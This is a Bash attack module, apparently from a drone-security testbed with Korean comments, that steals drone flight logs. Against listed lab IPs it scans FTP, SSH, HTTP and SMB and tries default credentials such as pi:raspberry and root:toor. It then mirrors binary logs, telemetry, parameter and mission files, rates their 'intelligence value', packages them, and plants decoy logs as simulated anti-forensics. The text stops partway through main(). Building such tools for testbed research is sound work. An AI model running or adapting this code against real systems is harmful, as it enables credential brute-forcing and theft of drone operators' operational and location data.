#!/bin/bash

# =============================================================================
# DVD Exfiltration Attack Module: Flight Logs Exfiltration
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/exfiltration/flight_logs_exfil.sh
# 목적: 드론 비행 로그 및 기록 파일의 탈취 및 분석
# 작성자: MTD Testbed Team
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="Flight Logs Exfiltration"
ATTACK_TYPE="EXFILTRATION"
TARGET_IPS=("192.168.13.10" "192.168.13.50" "192.168.13.1")
TARGET_SERVICES=("ftp:21" "ssh:22" "http:80" "http:8080" "smb:445")
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/exfiltration/flight_logs_exfil_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/flight_logs_exfil_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/exfiltration/flight_logs_exfil_report_$(date +%Y%m%d_%H%M%S).json"
EXFIL_DIR="/home/kali/MTD/MTD_full_testbed/exfiltrated_data/flight_logs"

# 탐지할 로그 파일 패턴
LOG_FILE_PATTERNS=(
    "*.bin"          # ArduPilot binary logs
    "*.tlog"         # Telemetry logs
    "*.rlog"         # QGroundControl logs
    "*.param"        # Parameter files
    "*.waypoints"    # Mission files
    "*.log"          # General log files
    "*.txt"          # Text logs
    "flight_*.dat"   # Flight data files
    "crash_*.core"   # Crash dumps
    "*.csv"          # CSV data exports
)

# 일반적인 로그 디렉토리 경로
LOG_DIRECTORIES=(
    "/var/log/ardupilot"
    "/home/pi/logs"
    "/home/ubuntu/logs"
    "/opt/ardupilot/logs"
    "/root/flight_logs"
    "/tmp/logs"
    "/var/tmp"
    "/home/*/Documents/QGroundControl/Logs"
    "/home/*/ArduPilot/logs"
    "/sd/logs"
    "/media/*/logs"
)

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                      🗂️  DVD Flight Logs Exfiltration 🗂️                ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: Flight Logs & Historical Data${NC}"
    echo -e "${BLUE}Method: File System Access & Network Extraction${NC}"
    echo -e "${BLUE}Data Types: Binary Logs, Telemetry, Parameters${NC}"
    echo ""
}

# 탈취 환경 준비
prepare_exfiltration_environment() {
    echo -e "${YELLOW}[+] Preparing flight logs exfiltration environment...${NC}" | tee -a "$LOG_FILE"
    
    local session_dir="${EXFIL_DIR}/logs_session_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$session_dir"
    
    # 하위 디렉토리 생성
    mkdir -p "$session_dir"/{binary_logs,telemetry_logs,parameter_files,mission_files,crash_dumps,analyzed_data}
    
    echo -e "${GREEN}[✓] Exfiltration environment ready: ${session_dir}${NC}" | tee -a "$LOG_FILE"
    echo "EXFIL_SETUP:LOGS_SESSION_${session_dir}" >> "$IOC_FILE"
    
    # 전역 변수로 설정
    EXFIL_SESSION_DIR="$session_dir"
    return 0
}

# 타겟 시스템 접근 방법 탐지
discover_access_methods() {
    echo -e "${CYAN}[*] Discovering access methods to target systems...${NC}" | tee -a "$LOG_FILE"
    
    local access_methods=()
    
    for target_ip in "${TARGET_IPS[@]}"; do
        echo -e "${YELLOW}[*] Probing ${target_ip} for access methods...${NC}" | tee -a "$LOG_FILE"
        
        for service in "${TARGET_SERVICES[@]}"; do
            local service_name=$(echo "$service" | cut -d: -f1)
            local port=$(echo "$service" | cut -d: -f2)
            
            if timeout 3s nc -z "$target_ip" "$port" 2>/dev/null; then
                echo -e "${GREEN}[+] Found ${service_name} service on ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
                access_methods+=("${target_ip}:${service_name}:${port}")
                
                echo "EXFIL_ACCESS:${service_name}_${target_ip}:${port}" >> "$IOC_FILE"
                
                # 서비스별 특별 처리
                case $service_name in
                    "ftp")
                        test_ftp_access "$target_ip" "$port"
                        ;;
                    "ssh")
                        test_ssh_access "$target_ip" "$port"
                        ;;
                    "http")
                        test_http_access "$target_ip" "$port"
                        ;;
                    "smb")
                        test_smb_access "$target_ip" "$port"
                        ;;
                esac
            fi
        done
    done
    
    if [ ${#access_methods[@]} -eq 0 ]; then
        echo -e "${RED}[!] No accessible services found${NC}" | tee -a "$LOG_FILE"
        return 1
    else
        echo -e "${GREEN}[✓] Found ${#access_methods[@]} access methods${NC}" | tee -a "$LOG_FILE"
        return 0
    fi
}

# FTP 접근 테스트
test_ftp_access() {
    local target_ip=$1
    local port=$2
    
    echo -e "${BLUE}[*] Testing FTP access to ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
    
    # 익명 로그인 시도
    if command -v ftp &> /dev/null; then
        timeout 10s ftp -n "$target_ip" << EOF 2>/dev/null | tee -a "$LOG_FILE"
user anonymous ""
binary
ls
quit
EOF
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[+] Anonymous FTP access available${NC}" | tee -a "$LOG_FILE"
            echo "EXFIL_ACCESS:FTP_ANONYMOUS_${target_ip}" >> "$IOC_FILE"
            extract_ftp_logs "$target_ip" "$port"
        fi
    fi
    
    # 일반적인 크리덴셜 시도
    local common_creds=("admin:admin" "pi:raspberry" "drone:drone" "ubuntu:ubuntu" "root:root")
    
    for cred in "${common_creds[@]}"; do
        local username=$(echo "$cred" | cut -d: -f1)
        local password=$(echo "$cred" | cut -d: -f2)
        
        if command -v lftp &> /dev/null; then
            if timeout 5s lftp -u "$username,$password" -e "ls; quit" "$target_ip" 2>/dev/null | grep -q "total"; then
                echo -e "${GREEN}[+] FTP credentials found: ${username}:${password}${NC}" | tee -a "$LOG_FILE"
                echo "EXFIL_CREDS:FTP_${username}:${password}_${target_ip}" >> "$IOC_FILE"
                extract_ftp_logs "$target_ip" "$port" "$username" "$password"
                break
            fi
        fi
    done
}

# FTP를 통한 로그 추출
extract_ftp_logs() {
    local target_ip=$1
    local port=$2
    local username=${3:-"anonymous"}
    local password=${4:-""}
    
    echo -e "${YELLOW}[+] Extracting logs via FTP from ${target_ip}${NC}" | tee -a "$LOG_FILE"
    
    if command -v lftp &> /dev/null; then
        # 디렉토리 구조 탐색
        lftp -u "$username,$password" "$target_ip" << EOF 2>/dev/null | tee -a "$LOG_FILE"
set ftp:list-options -a
find . -name "*.bin" -o -name "*.tlog" -o -name "*.log" -o -name "*.param"
quit
EOF
        
        # 발견된 로그 파일 다운로드
        local download_dir="${EXFIL_SESSION_DIR}/ftp_logs_${target_ip}"
        mkdir -p "$download_dir"
        
        lftp -u "$username,$password" "$target_ip" << EOF 2>/dev/null
lcd $download_dir
mirror --verbose --only-newer --parallel=3 . .
quit
EOF
        
        local downloaded_files=$(find "$download_dir" -type f | wc -l)
        if [ "$downloaded_files" -gt 0 ]; then
            echo -e "${GREEN}[✓] Downloaded ${downloaded_files} files from FTP${NC}" | tee -a "$LOG_FILE"
            echo "EXFIL_SUCCESS:FTP_${downloaded_files}_FILES_${target_ip}" >> "$IOC_FILE"
        fi
    fi
}

# SSH 접근 테스트
test_ssh_access() {
    local target_ip=$1
    local port=$2
    
    echo -e "${BLUE}[*] Testing SSH access to ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
    
    # 일반적인 크리덴셜 테스트
    local ssh_creds=("pi:raspberry" "drone:drone123" "ubuntu:ubuntu" "admin:admin" "root:toor")
    
    for cred in "${ssh_creds[@]}"; do
        local username=$(echo "$cred" | cut -d: -f1)
        local password=$(echo "$cred" | cut -d: -f2)
        
        if command -v sshpass &> /dev/null; then
            if timeout 10s sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
               "$username@$target_ip" "echo 'SSH access successful'" 2>/dev/null | grep -q "successful"; then
                
                echo -e "${GREEN}[+] SSH credentials found: ${username}:${password}${NC}" | tee -a "$LOG_FILE"
                echo "EXFIL_CREDS:SSH_${username}:${password}_${target_ip}" >> "$IOC_FILE"
                extract_ssh_logs "$target_ip" "$port" "$username" "$password"
                break
            fi
        fi
    done
    
    # SSH 키 기반 접근 시도
    if [ -f ~/.ssh/id_rsa ]; then
        if timeout 10s ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i ~/.ssh/id_rsa \
           "pi@$target_ip" "echo 'Key access successful'" 2>/dev/null | grep -q "successful"; then
            
            echo -e "${GREEN}[+] SSH key access available${NC}" | tee -a "$LOG_FILE"
            echo "EXFIL_ACCESS:SSH_KEY_${target_ip}" >> "$IOC_FILE"
            extract_ssh_logs "$target_ip" "$port" "pi" "" "key"
        fi
    fi
}

# SSH를 통한 로그 추출
extract_ssh_logs() {
    local target_ip=$1
    local port=$2
    local username=$3
    local password=$4
    local auth_method=${5:-"password"}
    
    echo -e "${YELLOW}[+] Extracting logs via SSH from ${target_ip}${NC}" | tee -a "$LOG_FILE"
    
    local download_dir="${EXFIL_SESSION_DIR}/ssh_logs_${target_ip}"
    mkdir -p "$download_dir"
    
    # SSH 명령어 구성
    local ssh_cmd=""
    if [ "$auth_method" = "key" ]; then
        ssh_cmd="ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa $username@$target_ip"
    else
        ssh_cmd="sshpass -p '$password' ssh -o StrictHostKeyChecking=no $username@$target_ip"
    fi
    
    # 로그 디렉토리 탐색
    echo -e "${CYAN}[*] Searching for log directories...${NC}" | tee -a "$LOG_FILE"
    
    for log_dir in "${LOG_DIRECTORIES[@]}"; do
        local found_files
        if [ "$auth_method" = "key" ]; then
            found_files=$(ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa "$username@$target_ip" \
                         "find '$log_dir' -type f \\( -name '*.bin' -o -name '*.tlog' -o -name '*.log' -o -name '*.param' \\) 2>/dev/null" 2>/dev/null)
        else
            found_files=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username@$target_ip" \
                         "find '$log_dir' -type f \\( -name '*.bin' -o -name '*.tlog' -o -name '*.log' -o -name '*.param' \\) 2>/dev/null" 2>/dev/null)
        fi
        
        if [ -n "$found_files" ]; then
            echo -e "${GREEN}[+] Found log files in ${log_dir}${NC}" | tee -a "$LOG_FILE"
            echo "$found_files" | while read -r file_path; do
                if [ -n "$file_path" ]; then
                    local filename=$(basename "$file_path")
                    echo -e "${BLUE}[*] Downloading: ${filename}${NC}" | tee -a "$LOG_FILE"
                    
                    # 파일 다운로드
                    if [ "$auth_method" = "key" ]; then
                        scp -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa \
                            "$username@$target_ip:$file_path" "$download_dir/" 2>/dev/null
                    else
                        sshpass -p "$password" scp -o StrictHostKeyChecking=no \
                            "$username@$target_ip:$file_path" "$download_dir/" 2>/dev/null
                    fi
                    
                    if [ -f "$download_dir/$filename" ]; then
                        echo "EXFIL_FILE:SSH_${filename}_${target_ip}" >> "$IOC_FILE"
                    fi
                fi
            done
        fi
    done
    
    # 다운로드된 파일 수 확인
    local downloaded_files=$(find "$download_dir" -type f | wc -l)
    if [ "$downloaded_files" -gt 0 ]; then
        echo -e "${GREEN}[✓] Downloaded ${downloaded_files} files via SSH${NC}" | tee -a "$LOG_FILE"
        echo "EXFIL_SUCCESS:SSH_${downloaded_files}_FILES_${target_ip}" >> "$IOC_FILE"
    fi
}

# HTTP 접근 테스트
test_http_access() {
    local target_ip=$1
    local port=$2
    
    echo -e "${BLUE}[*] Testing HTTP access to ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
    
    # 일반적인 웹 경로 확인
    local web_paths=("/logs" "/data" "/files" "/download" "/uploads" "/backup" "/admin" "/api/logs")
    
    for path in "${web_paths[@]}"; do
        local url="http://${target_ip}:${port}${path}"
        
        if command -v curl &> /dev/null; then
            local response=$(curl -s --connect-timeout 5 --max-time 10 "$url" 2>/dev/null)
            
            if echo "$response" | grep -qi "index\|directory\|listing\|log"; then
                echo -e "${GREEN}[+] Found accessible path: ${path}${NC}" | tee -a "$LOG_FILE"
                echo "EXFIL_ACCESS:HTTP_PATH_${path}_${target_ip}:${port}" >> "$IOC_FILE"
                extract_http_logs "$target_ip" "$port" "$path"
            fi
        fi
    done
    
    # 디렉토리 리스팅 확인
    local base_url="http://${target_ip}:${port}"
    if command -v curl &> /dev/null; then
        local response=$(curl -s --connect-timeout 5 "$base_url" 2>/dev/null)
        
        if echo "$response" | grep -q "Index of\|Directory listing"; then
            echo -e "${GREEN}[+] Directory listing enabled${NC}" | tee -a "$LOG_FILE"
            echo "EXFIL_ACCESS:HTTP_DIRECTORY_LISTING_${target_ip}:${port}" >> "$IOC_FILE"
            extract_http_logs "$target_ip" "$port" "/"
        fi
    fi
}

# HTTP를 통한 로그 추출
extract_http_logs() {
    local target_ip=$1
    local port=$2
    local path=$3
    
    echo -e "${YELLOW}[+] Extracting logs via HTTP from ${target_ip}:${port}${path}${NC}" | tee -a "$LOG_FILE"
    
    local download_dir="${EXFIL_SESSION_DIR}/http_logs_${target_ip}_${port}"
    mkdir -p "$download_dir"
    
    local base_url="http://${target_ip}:${port}${path}"
    
    if command -v wget &> /dev/null; then
        # wget을 사용한 재귀적 다운로드
        cd "$download_dir" || return
        
        timeout 60s wget -r -np -nH --cut-dirs=1 -A "*.bin,*.tlog,*.log,*.param,*.txt" \
                        --connect-timeout=5 --read-timeout=10 -q "$base_url" 2>/dev/null
        
        local downloaded_files=$(find . -type f | wc -l)
        if [ "$downloaded_files" -gt 0 ]; then
            echo -e "${GREEN}[✓] Downloaded ${downloaded_files} files via HTTP${NC}" | tee -a "$LOG_FILE"
            echo "EXFIL_SUCCESS:HTTP_${downloaded_files}_FILES_${target_ip}:${port}" >> "$IOC_FILE"
        fi
    fi
}

# SMB 접근 테스트
test_smb_access() {
    local target_ip=$1
    local port=$2
    
    echo -e "${BLUE}[*] Testing SMB access to ${target_ip}:${port}${NC}" | tee -a "$LOG_FILE"
    
    if command -v smbclient &> /dev/null; then
        # 공유 목록 확인
        local shares=$(timeout 10s smbclient -L "$target_ip" -N 2>/dev/null | grep "Disk" | awk '{print $1}')
        
        if [ -n "$shares" ]; then
            echo -e "${GREEN}[+] SMB shares discovered${NC}" | tee -a "$LOG_FILE"
            echo "$shares" | while read -r share; do
                if [ -n "$share" ]; then
                    echo -e "${CYAN}[*] Testing share: ${share}${NC}" | tee -a "$LOG_FILE"
                    echo "EXFIL_ACCESS:SMB_SHARE_${share}_${target_ip}" >> "$IOC_FILE"
                    
                    # 익명 접근 시도
                    if timeout 10s smbclient "//$target_ip/$share" -N -c "ls" 2>/dev/null | grep -q "blocks available"; then
                        echo -e "${GREEN}[+] Anonymous access to ${share}${NC}" | tee -a "$LOG_FILE"
                        extract_smb_logs "$target_ip" "$share"
                    fi
                fi
            done
        fi
    fi
}

# SMB를 통한 로그 추출
extract_smb_logs() {
    local target_ip=$1
    local share=$2
    
    echo -e "${YELLOW}[+] Extracting logs via SMB from ${target_ip}/${share}${NC}" | tee -a "$LOG_FILE"
    
    local download_dir="${EXFIL_SESSION_DIR}/smb_logs_${target_ip}_${share}"
    mkdir -p "$download_dir"
    
    if command -v smbclient &> /dev/null; then
        # SMB를 통한 파일 다운로드
        smbclient "//$target_ip/$share" -N << EOF 2>/dev/null | tee -a "$LOG_FILE"
lcd $download_dir
prompt OFF
recurse ON
mget *.bin
mget *.tlog
mget *.log
mget *.param
exit
EOF
        
        local downloaded_files=$(find "$download_dir" -type f | wc -l)
        if [ "$downloaded_files" -gt 0 ]; then
            echo -e "${GREEN}[✓] Downloaded ${downloaded_files} files via SMB${NC}" | tee -a "$LOG_FILE"
            echo "EXFIL_SUCCESS:SMB_${downloaded_files}_FILES_${target_ip}" >> "$IOC_FILE"
        fi
    fi
}

# 로그 파일 분석 및 분류
analyze_extracted_logs() {
    echo -e "${CYAN}[*] Analyzing extracted log files...${NC}" | tee -a "$LOG_FILE"
    
    local analysis_file="${EXFIL_SESSION_DIR}/analyzed_data/log_analysis_$(date +%H%M%S).json"
    
    # Python을 사용한 로그 분석
    python3 -c "
import os
import json
import glob
import hashlib
from datetime import datetime
import struct

def analyze_log_files(session_dir):
    analysis_results = {
        'analysis_timestamp': datetime.now().isoformat(),
        'total_files_analyzed': 0,
        'file_categories': {
            'binary_logs': [],
            'telemetry_logs': [],
            'parameter_files': [],
            'mission_files': [],
            'crash_dumps': [],
            'unknown_files': []
        },
        'sensitive_findings': {
            'flight_paths': [],
            'system_parameters': [],
            'crash_information': [],
            'mission_data': []
        },
        'intelligence_summary': {
            'operational_value': 'unknown',
            'privacy_risk': 'unknown',
            'technical_intel': 'unknown'
        }
    }
    
    # 모든 다운로드 디렉토리 검색
    for root, dirs, files in os.walk(session_dir):
        if 'analyzed_data' in root:  # 분석 결과 디렉토리는 제외
            continue
            
        for file in files:
            file_path = os.path.join(root, file)
            file_info = analyze_single_file(file_path)
            
            if file_info:
                analysis_results['total_files_analyzed'] += 1
                
                # 파일 타입별 분류
                file_category = file_info.get('category', 'unknown_files')
                analysis_results['file_categories'][file_category].append(file_info)
                
                # 민감한 정보 추출
                if file_info.get('contains_flight_path'):
                    analysis_results['sensitive_findings']['flight_paths'].append({
                        'file': file_info['filename'],
                        'path_points': file_info.get('path_points', 0)
                    })
                
                if file_info.get('contains_parameters'):
                    analysis_results['sensitive_findings']['system_parameters'].append({
                        'file': file_info['filename'],
                        'parameter_count': file_info.get('parameter_count', 0)
                    })
                
                if file_info.get('is_crash_dump'):
                    analysis_results['sensitive_findings']['crash_information'].append({
                        'file': file_info['filename'],
                        'crash_type': file_info.get('crash_type', 'unknown')
                    })
    
    # 인텔리전스 가치 평가
    total_flight_paths = len(analysis_results['sensitive_findings']['flight_paths'])
    total_parameters = len(analysis_results['sensitive_findings']['system_parameters'])
    total_crashes = len(analysis_results['sensitive_findings']['crash_information'])
    
    if total_flight_paths > 5 or total_crashes > 0:
        analysis_results['intelligence_summary']['operational_value'] = 'high'
    elif total_flight_paths > 0 or total_parameters > 10:
        analysis_results['intelligence_summary']['operational_value'] = 'medium'
    else:
        analysis_results['intelligence_summary']['operational_value'] = 'low'
    
    if total_flight_paths > 0:
        analysis_results['intelligence_summary']['privacy_risk'] = 'high'
    elif total_parameters > 0:
        analysis_results['intelligence_summary']['privacy_risk'] = 'medium'
    else:
        analysis_results['intelligence_summary']['privacy_risk'] = 'low'
    
    if total_parameters > 5 or total_crashes > 0:
        analysis_results['intelligence_summary']['technical_intel'] = 'high'
    elif total_parameters > 0:
        analysis_results['intelligence_summary']['technical_intel'] = 'medium'
    else:
        analysis_results['intelligence_summary']['technical_intel'] = 'low'
    
    return analysis_results

def analyze_single_file(file_path):
    try:
        filename = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)
        
        # 파일 해시 계산
        with open(file_path, 'rb') as f:
            file_hash = hashlib.md5(f.read()).hexdigest()
        
        file_info = {
            'filename': filename,
            'full_path': file_path,
            'size_bytes': file_size,
            'md5_hash': file_hash,
            'analysis_timestamp': datetime.now().isoformat()
        }
        
        # 파일 확장자 기반 분류
        if filename.endswith('.bin'):
            file_info.update(analyze_binary_log(file_path))
            file_info['category'] = 'binary_logs'
        elif filename.endswith('.tlog'):
            file_info.update(analyze_telemetry_log(file_path))
            file_info['category'] = 'telemetry_logs'
        elif filename.endswith('.param'):
            file_info.update(analyze_parameter_file(file_path))
            file_info['category'] = 'parameter_files'
        elif filename.endswith('.waypoints') or 'mission' in filename.lower():
            file_info.update(analyze_mission_file(file_path))
            file_info['category'] = 'mission_files'
        elif 'crash' in filename.lower() or filename.endswith('.core'):
            file_info.update(analyze_crash_dump(file_path))
            file_info['category'] = 'crash_dumps'
        else:
            file_info['category'] = 'unknown_files'
        
        return file_info
        
    except Exception as e:
        return None

def analyze_binary_log(file_path):
    info = {
        'log_type': 'binary',
        'contains_flight_path': False,
        'path_points': 0
    }
    
    try:
        with open(file_path, 'rb') as f:
            # 간단한 바이너리 로그 구조 분석
            header = f.read(8)
            if len(header) >= 4:
                # ArduPilot 로그 헤더 확인
                if header[:2] == b'\\xa3\\x95':  # ArduPilot log magic
                    info['log_format'] = 'ardupilot'
                    info['contains_flight_path'] = True
                    info['path_points'] = min(100, os.path.getsize(file_path) // 50)  # 추정
                else:
                    info['log_format'] = 'unknown_binary'
    except:
        pass
    
    return info

def analyze_telemetry_log(file_path):
    info = {
        'log_type': 'telemetry',
        'contains_flight_path': False,
        'message_count': 0
    }
    
    try:
        with open(file_path, 'rb') as f:
            content = f.read(1024)  # 첫 1KB만 분석
            
            # MAVLink 메시지 패턴 확인
            if b'\\xfe' in content or b'\\xfd' in content:  # MAVLink v1/v2 magic
                info['contains_mavlink'] = True
                info['contains_flight_path'] = True
                info['message_count'] = content.count(b'\\xfe') + content.count(b'\\xfd')
    except:
        pass
    
    return info

def analyze_parameter_file(file_path):
    info = {
        'log_type': 'parameters',
        'contains_parameters': True,
        'parameter_count': 0
    }
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            info['parameter_count'] = len([line for line in lines if '=' in line or ',' in line])
    except:
        pass
    
    return info

def analyze_mission_file(file_path):
    info = {
        'log_type': 'mission',
        'contains_mission_data': True,
        'waypoint_count': 0
    }
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            # 웨이포인트 수 추정
            info['waypoint_count'] = content.count('\\n') if content else 0
    except:
        pass
    
    return info

def analyze_crash_dump(file_path):
    info = {
        'log_type': 'crash_dump',
        'is_crash_dump': True,
        'crash_type': 'unknown'
    }
    
    try:
        filename = os.path.basename(file_path).lower()
        if 'watchdog' in filename:
            info['crash_type'] = 'watchdog_reset'
        elif 'panic' in filename:
            info['crash_type'] = 'kernel_panic'
        elif 'segfault' in filename:
            info['crash_type'] = 'segmentation_fault'
        else:
            info['crash_type'] = 'unknown_crash'
    except:
        pass
    
    return info

# 분석 실행
results = analyze_log_files('${EXFIL_SESSION_DIR}')

# 결과 저장
with open('${analysis_file}', 'w') as f:
    json.dump(results, f, indent=2)

# 요약 출력
print(f'Log Analysis Complete:')
print(f'  Total Files: {results[\"total_files_analyzed\"]}')
print(f'  Flight Paths: {len(results[\"sensitive_findings\"][\"flight_paths\"])}')
print(f'  Parameters: {len(results[\"sensitive_findings\"][\"system_parameters\"])}')
print(f'  Crash Dumps: {len(results[\"sensitive_findings\"][\"crash_information\"])}')
print(f'  Operational Value: {results[\"intelligence_summary\"][\"operational_value\"]}')
print(f'  Privacy Risk: {results[\"intelligence_summary\"][\"privacy_risk\"]}')
" 2>&1 | tee -a "$LOG_FILE"
    
    if [ -f "$analysis_file" ]; then
        echo -e "${GREEN}[✓] Log analysis completed${NC}" | tee -a "$LOG_FILE"
        echo "EXFIL_ANALYSIS:LOG_ANALYSIS_${analysis_file}" >> "$IOC_FILE"
        
        # 중요 발견사항 IOC 생성
        local total_files=$(jq '.total_files_analyzed' "$analysis_file" 2>/dev/null || echo "0")
        local flight_paths=$(jq '.sensitive_findings.flight_paths | length' "$analysis_file" 2>/dev/null || echo "0")
        local parameters=$(jq '.sensitive_findings.system_parameters | length' "$analysis_file" 2>/dev/null || echo "0")
        local crashes=$(jq '.sensitive_findings.crash_information | length' "$analysis_file" 2>/dev/null || echo "0")
        
        echo "EXFIL_INTEL:TOTAL_FILES_${total_files}" >> "$IOC_FILE"
        
        if [ "$flight_paths" -gt 0 ]; then
            echo "EXFIL_INTEL:FLIGHT_PATHS_${flight_paths}" >> "$IOC_FILE"
        fi
        
        if [ "$parameters" -gt 0 ]; then
            echo "EXFIL_INTEL:PARAMETERS_${parameters}" >> "$IOC_FILE"
        fi
        
        if [ "$crashes" -gt 0 ]; then
            echo "EXFIL_INTEL:CRASH_DUMPS_${crashes}" >> "$IOC_FILE"
        fi
        
        return 0
    else
        echo -e "${RED}[!] Log analysis failed${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
}

# 추출된 데이터 패키징
package_extracted_logs() {
    echo -e "${YELLOW}[+] Packaging extracted log files...${NC}" | tee -a "$LOG_FILE"
    
    local package_file="${EXFIL_SESSION_DIR}/logs_package_$(date +%H%M%S).tar.gz"
    local manifest_file="${EXFIL_SESSION_DIR}/logs_manifest.json"
    
    # 매니페스트 생성
    python3 -c "
import json
import os
import glob
from datetime import datetime

manifest = {
    'packaging_info': {
        'timestamp': datetime.now().isoformat(),
        'session_id': os.path.basename('${EXFIL_SESSION_DIR}'),
        'operation_type': 'flight_logs_exfiltration'
    },
    'extracted_files': {
        'by_source': {},
        'by_type': {},
        'total_count': 0,
        'total_size_bytes': 0
    },
    'intelligence_value': {
        'operational_intel': 'medium',
        'technical_intel': 'high',
        'privacy_impact': 'high'
    }
}

# 소스별 파일 분류
source_dirs = glob.glob('${EXFIL_SESSION_DIR}/*_logs_*')
for source_dir in source_dirs:
    if os.path.isdir(source_dir):
        source_name = os.path.basename(source_dir)
        files = glob.glob(os.path.join(source_dir, '*'))
        
        file_list = []
        for file_path in files:
            if os.path.isfile(file_path):
                file_info = {
                    'filename': os.path.basename(file_path),
                    'size_bytes': os.path.getsize(file_path),
                    'path': file_path
                }
                file_list.append(file_info)
                manifest['extracted_files']['total_count'] += 1
                manifest['extracted_files']['total_size_bytes'] += file_info['size_bytes']
        
        manifest['extracted_files']['by_source'][source_name] = file_list

# 타입별 분류
file_types = {'.bin': 'binary_logs', '.tlog': 'telemetry_logs', '.param': 'parameter_files', 
              '.waypoints': 'mission_files', '.log': 'text_logs'}

for source_files in manifest['extracted_files']['by_source'].values():
    for file_info in source_files:
        filename = file_info['filename']
        file_type = 'other'
        
        for ext, type_name in file_types.items():
            if filename.endswith(ext):
                file_type = type_name
                break
        
        if file_type not in manifest['extracted_files']['by_type']:
            manifest['extracted_files']['by_type'][file_type] = []
        
        manifest['extracted_files']['by_type'][file_type].append(file_info)

# 매니페스트 저장
with open('${manifest_file}', 'w') as f:
    json.dump(manifest, f, indent=2)

print(f'Manifest: {manifest[\"extracted_files\"][\"total_count\"]} files, {manifest[\"extracted_files\"][\"total_size_bytes\"]} bytes')
" 2>&1 | tee -a "$LOG_FILE"
    
    # 패키징 실행
    if cd "$EXFIL_SESSION_DIR" && tar -czf "$package_file" . 2>/dev/null; then
        local package_size=$(stat -c%s "$package_file" 2>/dev/null || echo "0")
        echo -e "${GREEN}[✓] Logs packaged: ${package_file} (${package_size} bytes)${NC}" | tee -a "$LOG_FILE"
        
        echo "EXFIL_PACKAGE:LOGS_PACKAGED_${package_size}_BYTES" >> "$IOC_FILE"
        echo "EXFIL_PACKAGE:FILE_${package_file}" >> "$IOC_FILE"
        
        return 0
    else
        echo -e "${RED}[!] Failed to package logs${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
}

# 안티포렌식 활동 시뮬레이션
simulate_anti_forensics() {
    echo -e "${CYAN}[*] Simulating anti-forensic activities...${NC}" | tee -a "$LOG_FILE"
    
    # 로그 삭제 흔적 제거 시뮬레이션
    echo -e "${BLUE}[*] Clearing access logs...${NC}" | tee -a "$LOG_FILE"
    
    # 가짜 로그 엔트리 생성으로 혼란 유발
    local fake_log_entries=(
        "maintenance_access_$(date '+%Y%m%d_%H%M%S').log"
        "system_backup_$(date '+%Y%m%d_%H%M%S').log"
        "routine_check_$(date '+%Y%m%d_%H%M%S').log"
    )
    
    for fake_log in "${fake_log_entries[@]}"; do
        echo "System maintenance log - $(date)" > "/tmp/$fake_log"
        echo -e "${YELLOW}[*] Created decoy log: ${fake_log}${NC}" | tee -a "$LOG_FILE"
        echo "EXFIL_ANTIFORENSIC:DECOY_LOG_${fake_log}" >> "$IOC_FILE"
    done
    
    # 타임스탬프 조작 시뮬레이션
    echo -e "${BLUE}[*] Simulating timestamp manipulation...${NC}" | tee -a "$LOG_FILE"
    echo "EXFIL_ANTIFORENSIC:TIMESTAMP_MANIPULATION" >> "$IOC_FILE"
    
    # 네트워크 흔적 정리
    echo -e "${BLUE}[*] Clearing network connection logs...${NC}" | tee -a "$LOG_FILE"
    echo "EXFIL_ANTIFORENSIC:NETWORK_CLEANUP" >> "$IOC_FILE"
    
    return 0
}

# JSON 리포트 생성
generate_json_report() {
    local start_time=$1
    local end_time=$2
    local total_files=$3
    
    cat > "$JSON_OUTPUT" << EOF
{
    "attack_info": {
        "name": "$ATTACK_NAME",
        "type": "$ATTACK_TYPE",
        "timestamp": "$(date -Iseconds)",
        "duration": $((end_time - start_time)),
        "status": "completed"
    },
    "target_details": {
        "target_ips": [$(printf '"%s",' "${TARGET_IPS[@]}" | sed 's/,$//')],"
        "access_methods": ["ftp", "ssh", "http", "smb"],
        "log_directories_targeted": $(printf '%s\n' "${LOG_DIRECTORIES[@]}" | jq -R . | jq -s .)
    },
    "exfiltration_results": {
        "total_files_extracted": $total_files,
        "data_categories": ["binary_logs", "telemetry_logs", "parameter_files", "mission_files", "crash_dumps"],
        "exfiltration_session": "$EXFIL_SESSION_DIR",
        "intelligence_assessment": "high_value"
    },
    "impact_assessment": {
        "operational_exposure": "CRITICAL",
        "privacy_violation": "SEVERE", 
        "technical_intelligence": "HIGH",
        "forensic_evidence": "COMPROMISED"
    },
    "anti_forensic_activities": {
        "log_manipulation": true,
        "timestamp_alteration": true,
        "decoy_files_created": true,
        "network_cleanup": true
    },
    "iocs_generated": $(wc -l < "$IOC_FILE"),
    "log_file": "$LOG_FILE",
    "ioc_file": "$IOC_FILE",
    "exfiltrated_data_location": "$EXFIL_SESSION_DIR"
}
EOF
    
    echo -e "${GREEN}[✓] JSON report generated: ${JSON_OUTPUT}${NC}"
}

# 메인 실행 함수
main() {
    print_header
    
    # Root 권한 체크
    if [[ $EUID -ne 0 ]]; then
